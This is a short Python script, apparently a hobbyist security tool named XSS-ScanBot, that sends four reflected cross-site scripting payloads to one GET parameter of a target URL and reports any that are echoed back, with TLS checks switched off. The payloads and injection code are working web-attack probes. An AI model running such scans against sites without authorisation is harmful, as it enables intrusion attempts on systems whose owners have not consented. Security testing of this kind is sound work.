#!/usr/bin/env python3
"""
XSS-ScanBot by Ambuj Tiwari
Automated reflected XSS scanner with JSON export.
"""
import argparse, json, requests
from urllib.parse import urlparse, urlencode
requests.packages.urllib3.disable_warnings()

# 1) PAYLOAD GENERATION (predefined)
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'\"><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>"
]

# Simple severity tagging by payload "complexity"
def payload_severity(payload):
    if "img" in payload or "svg" in payload:
        return "high"
    if "<script" in payload:
        return "medium"
    return "low"

# 2) INJECTION MODULE (GET params)
def inject_get(url, param, payload):
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    # original query + our payload param
    query = dict([kv.split("=", 1) if "=" in kv else (kv, "") 
                  for kv in filter(None, parsed.query.split("&"))])
    query[param] = payload
    full_url = base + "?" + urlencode(query, doseq=True)
    try:
        r = requests.get(full_url, timeout=8, verify=False)
        return full_url, r.text
    except:
        return full_url, ""

# 3) REFLECTION DETECTION
def scan_param(url, param):
    findings = []
    for p in XSS_PAYLOADS:
        full_url, body = inject_get(url, param, p)
        if p in body:      # simple reflection check
            findings.append({
                "param": param,
                "payload": p,
                "severity": payload_severity(p),
                "url": full_url
            })
    return findings

def main():
    parser = argparse.ArgumentParser(
        description="XSS-ScanBot by Ambuj Tiwari - Automated reflected XSS scanner"
    )
    parser.add_argument("-u", "--url", required=True,
                        help="Target URL with parameter name (e.g. http://testphp.vulnweb.com/listproducts.php?cat=1)")
    parser.add_argument("-p", "--param", required=True,
                        help="Parameter name to test (e.g. cat)")
    parser.add_argument("-o", "--output", default="xss_scanbot_report.json",
                        help="JSON output file")
    args = parser.parse_args()

    print(f"[+] Testing reflected XSS on {args.url}")
    print(f"[+] Parameter: {args.param}")
    results = scan_param(args.url, args.param)

    if not results:
        print("[-] No reflections detected with predefined payloads.")
    else:
        print(f"[+] Reflections found: {len(results)}")
        for f in results:
            print(f"  - {f['severity'].upper()} : {f['url']}  ({f['payload']})")

    # 4) JSON EXPORT
    report = {
        "target": args.url,
        "parameter": args.param,
        "findings": results
    }
    with open(args.output, "w") as fp:
        json.dump(report, fp, indent=2)
    print(f"[+] JSON report saved to {args.output}")

if __name__ == "__main__":
    main()
